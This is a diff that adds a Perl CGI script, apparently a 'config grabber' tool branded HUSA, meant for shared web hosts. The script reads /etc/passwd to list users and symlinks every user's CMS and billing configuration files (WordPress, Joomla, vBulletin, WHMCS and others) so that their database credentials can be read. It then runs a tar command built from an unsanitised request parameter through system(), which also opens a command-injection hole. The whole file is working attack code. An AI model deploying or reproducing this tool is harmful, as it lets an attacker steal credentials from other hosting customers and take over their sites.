@@ -1,0 +1,118 @@
+#!/usr/bin/perl -I/usr/local/bandmin
+###############################################  
+#   #      #  #      #  #######       #       #
+#   #      #  #      #  #            # #      #
+#   #      #  #      #  #           #   #     #
+#   #      #  #      #  #          #     #    #
+#   #      #  #      #  #         #       #   #
+#   ########  #      #  #######   #       #   #
+#   #      #  #      #        #   #       #   #
+#   #      #  #      #        #   #########   #
+#   #      #  #      #        #   #       #   #
+#   #      #  #      #        #   #       #   #
+#   #      #  ########  #######   #       #   #
+###############################################
+print "Content-type: text/html\n\n";
+print'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+<title>Users on Server</title>
+<style type="text/css">
+.newStyle1 {
+ background-color: #000000;
+ font-family: "Courier New", Courier, monospace;
+ font-size: large;
+ font-weight: bold;
+ color: #FFFFFF;
+}
+.style1 {
+ text-align: center;
+}
+</style>
+</head>
+';
+$filename = '/etc/passwd';
+open(FILE, $filename) or die "Could not read from $filename, program halting.";
+while(<FILE>)
+{
+@lines = <FILE>;
+}
+close FILE;
+sub lil{
+    ($user) = @_;
+$msr = qx{pwd};
+$kola=$msr."/".$user;
+$kola=~s/\n//g;
+symlink('/home/'.$user.'/public_html/vb/includes/config.php',$kola.'~~vBulletin1.txt');
+symlink('/home/'.$user.'/public_html/includes/config.php',$kola.'~~vBulletin2.txt');
+symlink('/home/'.$user.'/public_html/forum/includes/config.php',$kola.'~~vBulletin3.txt');
+symlink('/home/'.$user.'/public_html/cc/includes/config.php',$kola.'~~vBulletin4.txt');
+symlink('/home/'.$user.'/public_html/config.php',$kola.'~~Phpbb1.txt');
+symlink('/home/'.$user.'/public_html/forum/includes/config.php',$kola.'~~Phpbb2.txt');
+symlink('/home/'.$user.'/public_html/wp-config.php',$kola.'~~Wordpress1.txt');
+symlink('/home/'.$user.'/public_html/blog/wp-config.php',$kola.'~~Wordpress2.txt');
+symlink('/home/'.$user.'/public_html/configuration.php',$kola.'~~Joomla1.txt');
+symlink('/home/'.$user.'/public_html/blog/configuration.php',$kola.'~~Joomla2.txt');
+symlink('/home/'.$user.'/public_html/joomla/configuration.php',$kola.'~~Joomla3.txt');
+symlink('/home/'.$user.'/public_html/whm/configuration.php',$kola.'~~Whm1.txt');
+symlink('/home/'.$user.'/public_html/whmc/configuration.php',$kola.'~~Whm2.txt');
+symlink('/home/'.$user.'/public_html/support/configuration.php',$kola.'~~Whm3.txt');
+symlink('/home/'.$user.'/public_html/client/configuration.php',$kola.'~~Whm4.txt');
+symlink('/home/'.$user.'/public_html/billings/configuration.php',$kola.'~~Whm5.txt');
+symlink('/home/'.$user.'/public_html/billing/configuration.php',$kola.'~~Whm6.txt');
+symlink('/home/'.$user.'/public_html/clients/configuration.php',$kola.'~~Whm7.txt');
+symlink('/home/'.$user.'/public_html/whmcs/configuration.php',$kola.'~~Whm8.txt');
+symlink('/home/'.$user.'/public_html/order/configuration.php',$kola.'~~Whm9.txt');
+symlink('/home/'.$user.'/public_html/admin/conf.php',$kola.'~~5.txt');
+symlink('/home/'.$user.'/public_html/admin/config.php',$kola.'~~4.txt');
+symlink('/home/'.$user.'/public_html/conf_global.php',$kola.'~~invisio.txt');
+symlink('/home/'.$user.'/public_html/include/db.php',$kola.'~~7.txt');
+symlink('/home/'.$user.'/public_html/connect.php',$kola.'~~8.txt');
+symlink('/home/'.$user.'/public_html/mk_conf.php',$kola.'~~mk-portale1.txt');
+symlink('/home/'.$user.'/public_html/include/config.php',$kola.'~~12.txt');
+symlink('/home/'.$user.'/public_html/settings.php',$kola.'~~Smf.txt');
+symlink('/home/'.$user.'/public_html/includes/functions.php',$kola.'~~phpbb3.txt');
+symlink('/home/'.$user.'/public_html/include/db.php',$kola.'~~infinity.txt');
+}
+if ($ENV{'REQUEST_METHOD'} eq 'POST') {
+  read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
+} else {
+  $buffer = $ENV{'QUERY_STRING'};
+}
+@pairs = split(/&/, $buffer);
+foreach $pair (@pairs) {
+  ($name, $value) = split(/=/, $pair);
+  $name =~ tr/+/ /;
+  $name =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
+  $value =~ tr/+/ /;
+  $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
+  $FORM{$name} = $value;
+}
+if (@lines eq ""){
+print 'cant read /etc/passwd';
+}else{
+$y = @lines;
+open (MYFILE, ">tar.tmp");
+print MYFILE "tar -czf ".$FORM{tar}.".tar ";
+for ($ka=0;$ka<$y;$ka++){
+while(@lines[$ka]  =~ m/(.*?):x:/g){
+&lil($1);
+print MYFILE $1.".txt ";
+for($kd=1;$kd<18;$kd++){
+print MYFILE $1.$kd.".txt ";
+}
+}
+}
+print'<body class="newStyle1" bgcolor="#000000">
+<p>DONE > CONFIGer BY HUSA < !!</p>
+<p>&nbsp;</p>';
+if($FORM{tar} ne ""){
+open(INFO, "tar.tmp");
+@lines =<INFO> ;
+close(INFO);
+system(@lines);
+print'';
+}
+}
+print'';
